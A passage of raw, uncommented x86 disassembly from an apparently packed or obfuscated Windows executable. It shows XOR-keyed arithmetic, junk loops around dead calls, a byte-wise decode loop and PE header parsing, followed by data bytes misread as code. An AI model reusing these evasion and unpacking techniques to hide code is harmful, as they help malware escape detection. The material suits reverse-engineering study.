  4250f3:	xor    eax,esi
  4250f5:	add    eax,edi
  4250f7:	imul   eax,ecx
  4250fa:	mov    DWORD PTR [ebp-0xc],eax
  4250fd:	mov    eax,DWORD PTR [ebp-0x50]
  425100:	mov    ecx,DWORD PTR [ebp-0xc]
  425103:	xor    eax,esi
  425105:	add    eax,edi
  425107:	cmp    ecx,eax
  425109:	je     0x42526c
  42510f:	mov    eax,DWORD PTR [ebp-0xc]
  425112:	mov    DWORD PTR [ebp-0x30],eax
  425115:	mov    eax,DWORD PTR [ebp-0x8]
  425118:	add    eax,DWORD PTR [ebp-0x60]
  42511b:	mov    DWORD PTR [ebp-0x20],ebx
  42511e:	mov    DWORD PTR [ebp-0xc],eax
  425121:	mov    eax,0xbd8d95b3
  425126:	mov    DWORD PTR [ebp-0x4c],eax
  425129:	mov    DWORD PTR [ebp-0x58],0xbd8d95b2
  425130:	mov    DWORD PTR [ebp-0x44],0xbd8d95bd
  425137:	mov    DWORD PTR [ebp-0x3c],eax
  42513a:	mov    eax,DWORD PTR [ebp-0x20]
  42513d:	xor    eax,esi
  42513f:	add    eax,edi
  425141:	jmp    0x425228
  425146:	mov    DWORD PTR [ebp-0x64],0xbd8d95a5
  42514d:	mov    DWORD PTR [ebp-0x5c],0xbd8d95ae
  425154:	mov    eax,DWORD PTR [ebp-0x3c]
  425157:	mov    ecx,DWORD PTR [ebp-0x4]
  42515a:	xor    eax,esi
  42515c:	add    eax,edi
  42515e:	imul   eax,ecx
  425161:	mov    ecx,DWORD PTR [ebp-0xc]
  425164:	mov    al,BYTE PTR [eax+ecx*1]
  425167:	mov    BYTE PTR [ebp-0xd],al
  42516a:	mov    eax,DWORD PTR [ebp-0x3c]
  42516d:	mov    ecx,DWORD PTR [ebp-0x4]
  425170:	xor    eax,esi
  425172:	add    eax,edi
  425174:	imul   eax,ecx
  425177:	mov    ecx,DWORD PTR [ebp-0x58]
  42517a:	xor    ecx,esi
  42517c:	add    eax,ecx
  42517e:	mov    ecx,DWORD PTR [ebp-0xc]
  425181:	movzx  eax,BYTE PTR [eax+ecx*1+0x376272fb]
  425189:	mov    ecx,DWORD PTR [ebp-0x64]
  42518c:	xor    ecx,esi
  42518e:	lea    eax,[ecx+eax*1+0x376272fb]
  425195:	movzx  ecx,BYTE PTR [ebp-0xd]
  425199:	xor    ecx,eax
  42519b:	mov    BYTE PTR [ebp-0xd],cl
  42519e:	mov    al,BYTE PTR [ebp-0xd]
  4251a1:	mov    ecx,DWORD PTR [ebp-0x3c]
  4251a4:	mov    edx,DWORD PTR [ebp-0x4]
  4251a7:	xor    ecx,esi
  4251a9:	add    ecx,edi
  4251ab:	imul   ecx,edx
  4251ae:	mov    edx,DWORD PTR [ebp-0xc]
  4251b1:	mov    BYTE PTR [ecx+edx*1],al
  4251b4:	mov    eax,DWORD PTR [ebp-0x3c]
  4251b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4251ba:	xor    eax,esi
  4251bc:	add    eax,edi
  4251be:	imul   eax,ecx
  4251c1:	mov    ecx,DWORD PTR [ebp-0xc]
  4251c4:	mov    al,BYTE PTR [eax+ecx*1]
  4251c7:	mov    BYTE PTR [ebp-0xd],al
  4251ca:	mov    eax,DWORD PTR [ebp-0x3c]
  4251cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4251d0:	xor    eax,esi
  4251d2:	add    eax,edi
  4251d4:	imul   eax,ecx
  4251d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4251da:	xor    ecx,esi
  4251dc:	add    eax,ecx
  4251de:	mov    ecx,DWORD PTR [ebp-0xc]
  4251e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x376272fb]
  4251e9:	mov    ecx,DWORD PTR [ebp-0x5c]
  4251ec:	xor    ecx,esi
  4251ee:	lea    eax,[ecx+eax*1+0x376272fb]
  4251f5:	movzx  ecx,BYTE PTR [ebp-0xd]
  4251f9:	xor    ecx,eax
  4251fb:	mov    BYTE PTR [ebp-0xd],cl
  4251fe:	mov    al,BYTE PTR [ebp-0xd]
  425201:	mov    ecx,DWORD PTR [ebp-0x3c]
  425204:	mov    edx,DWORD PTR [ebp-0x4]
  425207:	xor    ecx,esi
  425209:	add    ecx,edi
  42520b:	imul   ecx,edx
  42520e:	mov    edx,DWORD PTR [ebp-0xc]
  425211:	mov    BYTE PTR [ecx+edx*1],al
  425214:	mov    eax,DWORD PTR [ebp-0x44]
  425217:	mov    ecx,DWORD PTR [ebp-0x4c]
  42521a:	xor    eax,esi
  42521c:	xor    ecx,esi
  42521e:	add    eax,edi
  425220:	add    ecx,edi
  425222:	imul   eax,ecx
  425225:	add    eax,DWORD PTR [ebp-0x4]
  425228:	mov    DWORD PTR [ebp-0x4],eax
  42522b:	mov    eax,DWORD PTR [ebp-0x4]
  42522e:	mov    ecx,DWORD PTR [ebp-0x30]
  425231:	cmp    ecx,eax
  425233:	jb     0x425146
  425239:	mov    eax,DWORD PTR [ebp-0x4c]
  42523c:	mov    ecx,DWORD PTR [ebp-0x30]
  42523f:	xor    eax,esi
  425241:	add    eax,edi
  425243:	imul   eax,ecx
  425246:	mov    ecx,DWORD PTR [ebp-0x20]
  425249:	xor    ecx,esi
  42524b:	add    ecx,edi
  42524d:	or     eax,ecx
  42524f:	mov    ecx,DWORD PTR [ebp-0x2c]
  425252:	xor    ecx,esi
  425254:	add    eax,ecx
  425256:	mov    ecx,DWORD PTR [ebp-0x2c]
  425259:	xor    ecx,esi
  42525b:	add    eax,ecx
  42525d:	mov    ecx,DWORD PTR [ebp-0x8]
  425260:	lea    eax,[eax+ecx*1+0x6ec4e5f6]
  425267:	jmp    0x42527b
  42526c:	mov    eax,DWORD PTR [ebp-0x2c]
  42526f:	mov    ecx,DWORD PTR [ebp-0x8]
  425272:	xor    eax,esi
  425274:	lea    eax,[eax+ecx*1+0x376272fb]
  42527b:	mov    DWORD PTR [ebp-0x8],eax
  42527e:	jmp    0x425097
  425283:	mov    eax,DWORD PTR [ebp-0x1c]
  425286:	mov    ecx,DWORD PTR [ebp+0x10]
  425289:	mov    edx,DWORD PTR [ebp+0x14]
  42528c:	mov    edx,DWORD PTR [ebp-0x24]
  42528f:	xor    ecx,0x6729a14b
  425295:	lea    eax,[eax+ecx*1+0x56424137]
  42529c:	lea    ecx,[eax-0x376272fb]
  4252a2:	xor    ecx,esi
  4252a4:	mov    DWORD PTR [ebp-0x1c],eax
  4252a7:	cmp    ecx,0xbd8db5b0
  4252ad:	jne    0x42503f
  4252b3:	dec    DWORD PTR [ebp-0x18]
  4252b6:	jne    0x424eb1
  4252bc:	mov    eax,DWORD PTR [ebp+0x8]
  4252bf:	mov    ecx,DWORD PTR [ebp+0xc]
  4252c2:	mov    esi,DWORD PTR [ebp+0x10]
  4252c5:	mov    edi,DWORD PTR [ebp+0x14]
  4252c8:	mov    edi,DWORD PTR [ebp+0x8]
  4252cb:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ce:	mov    ecx,0x6729a14b
  4252d3:	xor    esi,ecx
  4252d5:	mov    bl,BYTE PTR [esi+edx*1+0x56424137]
  4252dc:	mov    esi,DWORD PTR [ebp+0x10]
  4252df:	xor    eax,ecx
  4252e1:	mov    al,BYTE PTR [eax+edx*1+0x56424137]
  4252e8:	xor    edi,ecx
  4252ea:	mov    BYTE PTR [edi+edx*1+0x56424137],bl
  4252f1:	mov    edi,DWORD PTR [ebp+0x14]
  4252f4:	xor    esi,ecx
  4252f6:	mov    BYTE PTR [esi+edx*1+0x56424137],al
  4252fd:	mov    eax,DWORD PTR [ebp+0x10]
  425300:	mov    edx,DWORD PTR [ebp+0x14]
  425303:	xor    eax,ecx
  425305:	add    eax,0x56424137
  42530a:	pop    edi
  42530b:	pop    esi
  42530c:	pop    ebx
  42530d:	leave  
  42530e:	ret    0x10
  425311:	push   ebp
  425312:	mov    ebp,esp
  425314:	push   ecx
  425315:	mov    DWORD PTR ds:0x42683c,0x10
  42531f:	cmp    DWORD PTR ds:0x42683c,0x0
  425326:	je     0x425366
  42532c:	cmp    DWORD PTR ds:0x42683c,0x18
  425333:	jle    0x425366
  425339:	jmp    0x425356
  42533e:	push   0x426814
  425343:	push   0x8d81
  425348:	push   0x1d41
  42534d:	push   DWORD PTR [ebp-0x1c]
  425350:	call   DWORD PTR ds:0x4257a4
  425356:	mov    eax,ds:0x42683c
  42535b:	dec    eax
  42535c:	mov    ds:0x42683c,eax
  425361:	jmp    0x42531f
  425366:	push   ecx
  425367:	push   esi
  425368:	and    DWORD PTR ds:0x426854,0x0
  425372:	jmp    0x425382
  425377:	mov    eax,ds:0x426854
  42537c:	inc    eax
  42537d:	mov    ds:0x426854,eax
  425382:	cmp    DWORD PTR ds:0x426854,0x11
  425389:	jae    0x4253e6
  42538f:	cmp    DWORD PTR ds:0x426854,0xb
  425396:	jl     0x4253e6
  42539c:	jmp    0x4253c6
  4253a1:	push   0x534f
  4253a6:	push   0x85d0
  4253ab:	push   0x7982
  4253b0:	push   0x758d
  4253b5:	push   DWORD PTR [ebp-0x24]
  4253b8:	push   DWORD PTR [ebp-0x14]
  4253bb:	push   0x426059
  4253c0:	call   DWORD PTR ds:0x4257d4
  4253c6:	cmp    DWORD PTR ds:0x426854,0xa
  4253cd:	jne    0x4253e1
  4253d3:	xor    eax,eax
  4253d5:	or     eax,DWORD PTR ds:0x426854
  4253db:	inc    eax
  4253dc:	mov    ds:0x426854,eax
  4253e1:	jmp    0x425377
  4253e6:	mov    DWORD PTR [ebp-0x8],0xce941f82
  4253ed:	mov    esi,0xffff2df0
  4253f2:	mov    DWORD PTR [ebp-0x4],esi
  4253f5:	mov    eax,DWORD PTR [ebp+0x8]
  4253f8:	movsx  eax,BYTE PTR [eax]
  4253fb:	cdq    
  4253fc:	add    eax,0xa9bdbec9
  425401:	adc    edx,0xffffa89a
  425407:	mov    ecx,0x6729a14b
  42540c:	xor    eax,ecx
  42540e:	xor    edx,0x856a
  425414:	cmp    eax,0xce941e5d
  425419:	jne    0x425465
  42541f:	cmp    edx,esi
  425421:	jne    0x425465
  425427:	mov    eax,DWORD PTR [ebp+0x8]
  42542a:	mov    edx,DWORD PTR [ebp+0x8]
  42542d:	add    edx,DWORD PTR [eax+0x3c]
  425430:	mov    DWORD PTR [ebp+0x8],edx
  425433:	mov    eax,DWORD PTR [ebp-0x8]
  425436:	mov    edx,DWORD PTR [ebp-0x4]
  425439:	mov    esi,DWORD PTR [ebp+0x8]
  42543c:	xor    eax,ecx
  42543e:	mov    edx,0x56424137
  425443:	add    eax,edx
  425445:	cmp    DWORD PTR [esi+0x54],eax
  425448:	je     0x425456
  42544e:	mov    eax,DWORD PTR [ebp+0x8]
  425451:	jmp    0x425472
  425456:	mov    eax,DWORD PTR [ebp-0x8]
  425459:	mov    esi,DWORD PTR [ebp-0x4]
  42545c:	xor    eax,ecx
  42545e:	add    eax,edx
  425460:	jmp    0x425472
  425465:	mov    eax,DWORD PTR [ebp-0x8]
  425468:	mov    edx,DWORD PTR [ebp-0x4]
  42546b:	xor    eax,ecx
  42546d:	add    eax,0x56424137
  425472:	pop    esi
  425473:	leave  
  425474:	ret    0x4
  425477:	push   ebp
  425478:	mov    ebp,esp
  42547a:	sub    esp,0x18
  42547d:	sub    DWORD PTR ds:0x4267d0,0x6eab
  425487:	mov    DWORD PTR [ebp-0x18],0xce941f82
  42548e:	mov    eax,0xffff2df0
  425493:	mov    DWORD PTR [ebp-0x14],eax
  425496:	mov    ecx,DWORD PTR ds:0x426840
  42549c:	and    DWORD PTR ds:0x4267e4,ecx
  4254a2:	mov    DWORD PTR [ebp-0x10],0xce941f81
  4254a9:	mov    DWORD PTR [ebp-0xc],eax
  4254ac:	and    DWORD PTR ds:0x4267b8,0x0
  4254b6:	jmp    0x4254c6
  4254bb:	mov    eax,ds:0x4267b8
  4254c0:	inc    eax
  4254c1:	mov    ds:0x4267b8,eax
  4254c6:	cmp    DWORD PTR ds:0x4267b8,0x12
  4254cd:	jae    0x42551e
  4254d3:	cmp    DWORD PTR ds:0x4267b8,0x8
  4254da:	jge    0x42551e
  4254e0:	jmp    0x425501
  4254e5:	push   0x426854
  4254ea:	push   0x8be2
  4254ef:	push   DWORD PTR [ebp-0x20]
  4254f2:	push   DWORD PTR [ebp-0x28]
  4254f5:	push   DWORD PTR [ebp-0x1c]
  4254f8:	push   DWORD PTR [ebp-0x18]
  4254fb:	call   DWORD PTR ds:0x4257d8
  425501:	cmp    DWORD PTR ds:0x4267b8,0x7
  425508:	jne    0x425519
  42550e:	mov    eax,ds:0x4267b8
  425513:	inc    eax
  425514:	mov    ds:0x4267b8,eax
  425519:	jmp    0x4254bb
  42551e:	mov    eax,DWORD PTR [ebp-0x10]
  425521:	mov    edx,DWORD PTR ds:0x4267e0
  425527:	adc    DWORD PTR ds:0x42685c,edx
  42552d:	mov    ecx,DWORD PTR [ebp-0xc]
  425530:	push   esi
  425531:	mov    esi,DWORD PTR ds:0x4267b0
  425537:	adc    DWORD PTR ds:0x4267b8,esi
  42553d:	mov    esi,DWORD PTR [ebp-0x18]
  425540:	movzx  ecx,BYTE PTR ds:0x426824
  425547:	or     ecx,DWORD PTR ds:0x42685c
  42554d:	mov    DWORD PTR ds:0x426824,ecx
  425553:	mov    edx,0x6729a14b
  425558:	xor    eax,edx
  42555a:	mov    DWORD PTR ds:0x42685c,0x1f
  425564:	cmp    DWORD PTR ds:0x42685c,0x0
  42556b:	je     0x4255bf
  425571:	cmp    DWORD PTR ds:0x42685c,0x5
  425578:	jg     0x4255bf
  42557e:	jmp    0x425593
  425583:	push   0x426804
  425588:	push   0x73e9
  42558d:	call   DWORD PTR ds:0x4257e0
  425593:	cmp    DWORD PTR ds:0x42685c,0x6
  42559a:	jne    0x4255ad
  4255a0:	mov    ecx,DWORD PTR ds:0x42685c
  4255a6:	dec    ecx
  4255a7:	mov    DWORD PTR ds:0x42685c,ecx
  4255ad:	mov    ecx,DWORD PTR ds:0x42685c
  4255b3:	dec    ecx
  4255b4:	mov    DWORD PTR ds:0x42685c,ecx
  4255ba:	jmp    0x425564
  4255bf:	xor    esi,edx
  4255c1:	mov    ecx,0x56424137
  4255c6:	add    esi,ecx
  4255c8:	add    eax,ecx
  4255ca:	imul   eax,esi
  4255cd:	push   edi
  4255ce:	mov    edi,DWORD PTR [ebp-0x14]
  4255d1:	mov    esi,DWORD PTR [ebp+0xc]
  4255d4:	cmp    esi,eax
  4255d6:	je     0x42563b
  4255dc:	mov    DWORD PTR [ebp-0x4],0xbd8d95b0
  4255e3:	mov    eax,DWORD PTR [ebp-0x4]
  4255e6:	mov    esi,DWORD PTR [ebp+0xc]
  4255e9:	xor    eax,0x751018b5
  4255ee:	lea    eax,[eax*8-0x44ec67b0]
  4255f5:	mov    eax,DWORD PTR [esi+eax*1]
  4255f8:	mov    DWORD PTR [ebp+0xc],eax
  4255fb:	mov    eax,DWORD PTR [ebp-0x10]
  4255fe:	mov    esi,DWORD PTR [ebp-0xc]
  425601:	mov    esi,DWORD PTR [ebp-0x18]
  425604:	mov    edi,DWORD PTR [ebp-0x14]
  425607:	xor    eax,edx
  425609:	xor    esi,edx
  42560b:	add    esi,ecx
  42560d:	add    eax,ecx
  42560f:	imul   eax,esi
  425612:	mov    esi,DWORD PTR [ebp+0xc]
  425615:	cmp    esi,eax
  425617:	je     0x42563b
  42561d:	mov    eax,DWORD PTR [ebp-0x10]
  425620:	mov    esi,DWORD PTR [ebp-0xc]
  425623:	xor    eax,edx
  425625:	add    eax,ecx
  425627:	mov    ecx,DWORD PTR [ebp+0xc]
  42562a:	imul   eax,ecx
  42562d:	add    eax,DWORD PTR [ebp+0x8]
  425630:	mov    DWORD PTR [ebp+0xc],eax
  425633:	mov    eax,DWORD PTR [ebp+0xc]
  425636:	jmp    0x425652
  42563b:	mov    eax,DWORD PTR [ebp-0x10]
  42563e:	mov    esi,DWORD PTR [ebp-0xc]
  425641:	mov    esi,DWORD PTR [ebp-0x18]
  425644:	mov    edi,DWORD PTR [ebp-0x14]
  425647:	xor    esi,edx
  425649:	xor    eax,edx
  42564b:	add    esi,ecx
  42564d:	add    eax,ecx
  42564f:	imul   eax,esi
  425652:	pop    edi
  425653:	pop    esi
  425654:	leave  
  425655:	ret    0x8
	...
  425664:	push   edi
  425665:	mov    esi,0x4d14
  42566a:	add    BYTE PTR [eax],al
  42566c:	add    al,BYTE PTR [eax]
  42566e:	add    BYTE PTR [eax],al
  425670:	add    BYTE PTR ss:[eax],al
  425673:	add    BYTE PTR [eax-0x7ffffdaa],al
  425679:	dec    edx
  42567a:	add    al,BYTE PTR [eax]
  42567c:	add    BYTE PTR [eax],al
  42567e:	add    BYTE PTR [eax],al
  425680:	push   edx
  425681:	push   ebx
  425682:	inc    esp
  425683:	push   ebx
  425684:	inc    ebx
  425685:	add    DWORD PTR [esi],edi
  425687:	jns    0x4256b8
  425689:	gs add eax,0xf39aa46
  42568f:	xchg   edx,eax
  425690:	add    dl,cl
  425692:	xor    BYTE PTR [esi+0x1],ch
  425698:	inc    ebx
  425699:	cmp    bl,BYTE PTR [eax+ecx*2+0x65]
  42569d:	ins    BYTE PTR es:[edi],dx
  42569e:	ins    BYTE PTR es:[edi],dx
  42569f:	outs   dx,DWORD PTR ds:[esi]
  4256a0:	pop    esp
  4256a1:	dec    ecx
  4256a2:	outs   dx,BYTE PTR ds:[esi]
  4256a3:	jae    0x42570a
  4256a5:	jb     0x42571b
  4256a7:	pop    esp
  4256a8:	inc    esp
  4256a9:	popa   
  4256aa:	je     0x42570d
  4256ac:	pop    esp
  4256ad:	inc    esi
  4256ae:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x657865
	...
  4256c2:	add    BYTE PTR [eax],al
  4256c4:	push   edi
  4256c5:	mov    esi,0x4d14
  4256ca:	add    BYTE PTR [eax],al
  4256cc:	cld    
  4256cd:	push   esi
  4256ce:	add    al,BYTE PTR [eax]
  4256d0:	add    DWORD PTR [eax],eax
  4256d2:	add    BYTE PTR [eax],al
  4256d4:	add    al,BYTE PTR [eax]
  4256d6:	add    BYTE PTR [eax],al
  4256d8:	add    al,BYTE PTR [eax]
  4256da:	add    BYTE PTR [eax],al
  4256dc:	call   0xf0425937
  4256e1:	push   esi
  4256e2:	add    al,BYTE PTR [eax]
  4256e4:	clc    
  4256e5:	push   esi
  4256e6:	add    al,BYTE PTR [eax]
  4256e8:	pop    ebp
  4256e9:	pop    ebx
  4256ea:	add    BYTE PTR [eax],al
  4256ec:	push   edx
  4256ed:	pop    ebx
  4256ee:	add    BYTE PTR [eax],al
  4256f0:	or     al,0x57
  4256f2:	add    al,BYTE PTR [eax]
  4256f4:	ss push edi
  4256f6:	add    al,BYTE PTR [eax]
  4256f8:	add    BYTE PTR [eax],al
  4256fa:	add    DWORD PTR [eax],eax
  4256fc:	push   ebx
  4256fd:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  425702:	outs   dx,BYTE PTR ds:[esi]
  425703:	inc    esp
  425704:	popa   
  425705:	je     0x425768
  425707:	cs gs js 0x425770
  42570b:	add    BYTE PTR [edi+0x53],bl
  42570e:	gs je  0x42575e
  425711:	gs jae 0x425787
  425714:	popa   
  425715:	addr16 gs inc ebp
  425718:	js     0x42578e
  42571a:	jb     0x42577d
  42571c:	dec    ecx
  42571d:	outs   dx,BYTE PTR ds:[esi]
  42571e:	outs   dx,WORD PTR ds:[esi]
  425720:	push   ebx
  425721:	gs je  0x425771
  425724:	gs jae 0x42579a
  425727:	popa   
  425728:	addr16 gs inc ebp
  42572b:	js     0x4257a1
  42572d:	jb     0x425790
  42572f:	dec    ecx
  425730:	outs   dx,BYTE PTR ds:[esi]
  425731:	outs   dx,WORD PTR ds:[esi]
  425733:	inc    eax
  425734:	xor    BYTE PTR [eax],al
  425736:	pop    edi
  425737:	push   ebx
  425738:	gs je  0x425788
  42573b:	gs jae 0x4257b1
  42573e:	popa   
  42573f:	addr16 gs inc ebp
  425742:	js     0x4257b8
  425744:	jb     0x4257a7
  425746:	dec    ecx
  425747:	outs   dx,BYTE PTR ds:[esi]
  425748:	outs   dx,WORD PTR ds:[esi]
  42574a:	push   ebx
  42574b:	gs je  0x42579b
  42574e:	gs jae 0x4257c4
  425751:	popa   
  425752:	addr16 gs inc ebp
  425755:	js     0x4257cb
  425757:	jb     0x4257ba
  425759:	dec    ecx
  42575a:	outs   dx,BYTE PTR ds:[esi]
  42575b:	outs   dx,WORD PTR ds:[esi]
  42575d:	push   ebx
  42575e:	gs je  0x4257ae
  425761:	gs jae 0x4257d7
  425764:	popa   
  425765:	addr16 gs inc ebp
  425768:	js     0x4257de
  42576a:	jb     0x4257cd
  42576c:	dec    ecx
  42576d:	outs   dx,BYTE PTR ds:[esi]
  42576e:	outs   dx,WORD PTR ds:[esi]
  425770:	inc    eax
  425771:	xor    BYTE PTR [eax],al
	...
  42577f:	add    BYTE PTR [eax-0x35fffd97],bh
  425785:	imul   eax,DWORD PTR [edx],0x269da00
  42578b:	add    al,dh
  42578d:	imul   eax,DWORD PTR [edx],0x26a0000
  425793:	add    BYTE PTR [esi],dl
  425795:	push   0x2
  425797:	add    BYTE PTR [eax],dh
  425799:	push   0x2
  42579b:	add    BYTE PTR [eax+0x6a],al
  42579e:	add    al,BYTE PTR [eax]
  4257a0:	push   eax
  4257a1:	push   0x2
  4257a3:	add    BYTE PTR [edx+0x6a],ch
  4257a6:	add    al,BYTE PTR [eax]
  4257a8:	jle    0x425814
  4257aa:	add    al,BYTE PTR [eax]
  4257ac:	add    BYTE PTR [eax],al
  4257ae:	add    BYTE PTR [eax],al
  4257b0:	xchg   edx,eax
  4257b1:	push   0x2
  4257b3:	add    BYTE PTR [eax-0x45fffd96],ch
  4257b9:	push   0x2
  4257bb:	add    dh,cl
  4257bd:	push   0x2
  4257bf:	add    dl,bl
  4257c1:	push   0x2
  4257c3:	add    al,bh
  4257c5:	push   0x2
  4257c7:	add    BYTE PTR [edx],cl
  4257c9:	imul   eax,DWORD PTR [edx],0x0
  4257cc:	and    ch,BYTE PTR [ebx+0x2]
  4257cf:	add    BYTE PTR [esi],dh
  4257d1:	imul   eax,DWORD PTR [edx],0x0
  4257d4:	inc    edx
  4257d5:	imul   eax,DWORD PTR [edx],0x0
  4257d8:	push   eax
  4257d9:	imul   eax,DWORD PTR [edx],0x0
  4257dc:	pusha  
  4257dd:	imul   eax,DWORD PTR [edx],0x0
  4257e0:	jb     0x42584d
  4257e2:	add    al,BYTE PTR [eax]
  4257e4:	mov    ch,BYTE PTR [ebx+0x2]
  4257e7:	add    BYTE PTR [eax],al
  4257e9:	add    BYTE PTR [eax],al
	...
